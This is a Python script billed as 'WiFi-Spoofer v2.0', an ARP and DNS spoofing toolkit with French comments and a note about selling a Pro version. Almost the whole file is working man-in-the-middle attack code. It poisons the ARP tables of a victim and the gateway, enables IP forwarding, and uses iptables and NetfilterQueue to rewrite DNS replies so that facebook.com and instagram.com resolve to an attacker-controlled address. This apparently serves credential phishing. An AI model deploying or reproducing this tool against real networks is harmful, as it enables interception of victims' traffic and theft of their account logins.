#!/usr/bin/env python3
"""_______   ____ ____________  ____  __.___________
╲______ ╲ │    │   ╲_   ___ ╲│    │╱ _│╲__    ___╱
 │    │  ╲│    │   ╱    ╲  ╲╱│      <    │    │   
 │    `   ╲    │  ╱╲     ╲___│    │  ╲   │    │   
╱_______  ╱______╱  ╲______  ╱____│__ ╲  │____│   
        ╲╱                 ╲╱        ╲╱


WiFi-Spoofer v2.0 - ARP/DNS Spoofing Toolkit
Coco
Monétisation: Version Pro avec interface web + plugins premium
"""

import os
import sys
import time
import threading
from scapy.all import ARP, Ether, srp, send, IP, DNSRR, DNSQR, DNS, UDP  # type: ignore
from netfilterqueue import NetfilterQueue  # type: ignore
import subprocess

class WiFiSpoofer:
    def __init__(self):
        self.target_ip = "192.168.1.100"
        self.gateway_ip = "192.168.1.1"
        self.interface = "wlan0"
        self.packet_count = 0
        self.running = False
        
    def enable_ip_forwarding(self):
        """Active le forwarding IP pour MITM"""
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("[+] IP forwarding activé")
        
    def get_mac(self, ip):
        """Récupère l'adresse MAC d'une IP"""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered[0][1].hwsrc if answered else None
        
    def spoof(self, target_ip, spoof_ip):
        """Envoie des paquets ARP spoofés"""
        target_mac = self.get_mac(target_ip)
        if target_mac:
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            send(packet, verbose=False)
            return True
        return False
        
    def restore(self, destination_ip, source_ip):
        """Restaure les tables ARP"""
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        if destination_mac and source_mac:
            packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, 
                        psrc=source_ip, hwsrc=source_mac)
            send(packet, count=4, verbose=False)
            
    def dns_spoof(self, queue):
        """DNS Spoofing avec NetfilterQueue"""
        def process_packet(packet):
            ip_packet = IP(packet.get_payload())
            if ip_packet.haslayer(DNSRR):
                qname = ip_packet[DNSQR].qname.decode()
                if "facebook.com" in qname or "instagram.com" in qname:
                    # Redirige vers notre serveur
                    spoofed_ip = "192.168.1.50"
                    dns_response = DNSRR(rrname=qname, rdata=spoofed_ip)
                    ip_packet[DNS].an = dns_response
                    ip_packet[DNS].ancount = 1
                    
                    # Recréer le checksum
                    del ip_packet[IP].chksum
                    del ip_packet[UDP].chksum
                    del ip_packet[DNS].chksum
                    
                    packet.set_payload(bytes(ip_packet))
            packet.accept()
            
        nfqueue = NetfilterQueue()
        nfqueue.bind(0, process_packet)
        try:
            nfqueue.run()
        except KeyboardInterrupt:
            pass
            
    def start_attack(self):
        """Lance l'attaque complète"""
        print(f"[+] Début du spoofing {self.target_ip} <-> {self.gateway_ip}")
        self.running = True
        self.enable_ip_forwarding()
        
        # Thread ARP spoofing
        def arp_spoof():
            while self.running:
                self.spoof(self.target_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, self.target_ip)
                self.packet_count += 2
                time.sleep(2)
                
        # Thread DNS spoofing
        def dns_spoof_thread():
            os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
            self.dns_spoof(0)
            
        t1 = threading.Thread(target=arp_spoof)
        t2 = threading.Thread(target=dns_spoof_thread)
        t1.start()
        t2.start()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print("\n[!] Arrêt de l'attaque...")
            self.restore(self.gateway_ip, self.target_ip)
            self.restore(self.target_ip, self.gateway_ip)
            os.system("iptables --flush")
            
if __name__ == "__main__":
    spoofer = WiFiSpoofer()
    spoofer.start_attack()
